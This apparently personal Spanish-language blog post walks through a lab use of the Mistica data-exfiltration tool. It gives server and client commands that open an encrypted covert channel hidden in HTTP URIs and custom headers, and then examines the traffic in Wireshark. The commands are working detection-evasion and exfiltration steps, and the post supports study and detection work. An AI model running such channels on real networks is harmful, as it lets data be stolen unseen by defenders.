---
title: Data Exfiltration - Mistica
date: 2021-01-08 19:17:00 Z
---

![Mistica.png]({{site.baseurl}}/images/Mistica/Mistica.png)

[https://github.com/IncideDigital/Mistica](https://github.com/IncideDigital/Mistica)


Mistica is a tool that allows to **embed data into application layer protocol fields**, with the g**oal of establishing a bi-directional channel for arbitrary communications**. Currently, **encapsulation into HTTP, DNS and ICMP protocols** has been implemented, but more protocols are expected to be introduced in the near future.


Mística has a modular design, **built around a custom transport protocol, called SOTP**: Simple Overlay Transport Protocol. **Data is encrypted, chunked and put into SOTP packets. SOTP packets are encoded and embedded into the desired field of the application protocol, and sent to the other end.**


SOTP, cifra los datos en pequeños bloques y los introduce en protocolos de aplicación.
Podemos partir un fichero en cachitos y transportarlo en SOTP. 

Dota a nuestros canales con unas características especiales para poderlo encapsular el protocolo SOTP, en los protocolos DNS,ICMP.

Aparte, tienes unas características esenciales, es bidereccional, cifrado y confidencial.

Uno de los creadores, lo documenta mucho mejor que yo:
[https://www.youtube.com/watch?v=xMNAhPkyRmc](https://www.youtube.com/watch?v=xMNAhPkyRmc)

Otra referencia sobre la herramienta
[https://darkbyte.net/jugando-con-remote-shells-parte-iii-mistica/](https://darkbyte.net/jugando-con-remote-shells-parte-iii-mistica/)


El objetivo será mostrar el funcionamiento de los diferentes protocolos.
Y ver la información y rastro que nos muestra WireShark.

***No soy un experto ni mucho menos.**

### Encapsulación HTTP

La comunicación se producirá a través del protocolo web http, con el objetivo de evitar detecciones, intentaremos mezclamos con el tráfico existente.


Este protocolo es muy utilizado por los chungos, ya que hay procesos internos en entornos Windows que utilizan este protocolo, como las actualizaciones de Windows.


Como veremos en los siguientes ejemplos, haremos uso de las propiedades de HTTP, como son las cabeceras e introduciremos los datos.


Más información: [https://attack.mitre.org/techniques/T1071/001/](https://attack.mitre.org/techniques/T1071/001/)

**Servidor**

`
./ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -k Key
`
![image001.png]({{site.baseurl}}/images/Mistica/image001.png)
**Cliente**

`
python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:http -w "--hostname 192.168.1.142 --port 80" -k key
`
![image002.png]({{site.baseurl}}/images/Mistica/image002.png)

Una vez producida la conexión no se nos muestra ningún banner.

Realizamos una prueba, desde el cliente Windows, nos comunicamos con el servidor:

![image003.png]({{site.baseurl}}/images/Mistica/image003.png)

Y en el servidor nos mostrará este mismo mensaje.

![image004.png]({{site.baseurl}}/images/Mistica/image004.png)

**Es biderecional, la comunicación se puede realizar tanto desde el cliente como del servidor.**

Analizamos la información con WireShark.

Primero vamos a realizar el filtrado, en este caso, indicando únicamente el protcolo http, nos mostrará las conexiones que se han ido realizando entre estos equipos.

Server Parrot: 192.168.1.142

Cliente Windows : 192.168.1.139

![image005.png]({{site.baseurl}}/images/Mistica/image005.png)

Podemos observar como el cliente (192.168.1.139) está constantemente realizando solicitudes get al servidor, esto es una funcionalidad de los Overlays, se encargan de preguntar constantemente al servidor.

La información va cifrada en RC4

![image006.png]({{site.baseurl}}/images/Mistica/image006.png)


En los paquetes HTTP generados por un navegador web, nos muestra el User-Agent, en este caso vemos que no.

### Customización de URI

Servidor

`python3.8 ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -w "--uri /?token=" -k key`
![image007.png]({{site.baseurl}}/images/Mistica/image007.png)

Cliente

`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:http -w "--hostname 192.168.1.142 --port 80 --header token" -k key`

![image008.png]({{site.baseurl}}/images/Mistica/image008.png)

A través de WireShark lo entenderemos mejor.

![image009.png]({{site.baseurl}}/images/Mistica/image009.png)

Observamos, como hemos modificado la uri, indicando que el paquete OSTP sea transportado a continuación de “**/?token=**”

### HEADER

En este ejemplo, la información será transmitida por una cabecera customizada de HTTP

**Servidor**

`python3.8 ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -w "--header token" -k key`
![image010.png]({{site.baseurl}}/images/Mistica/image010.png)

**Cliente**

`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:http -w "--hostname 192.168.1.142 --port 80 --header token" -k key
`
![image011.png]({{site.baseurl}}/images/Mistica/image011.png)

Realizamos una prueba entre ambos equipos.
Y vemos la información en WireShark de la siguiente forma:

![image012.png]({{site.baseurl}}/images/Mistica/image012.png)

Como vemos, ya no aparece nada en la uri, si vemos las peticiones, la información se mostrará dentro del header token, creada anteriormente.

![image013.png]({{site.baseurl}}/images/Mistica/image013.png)
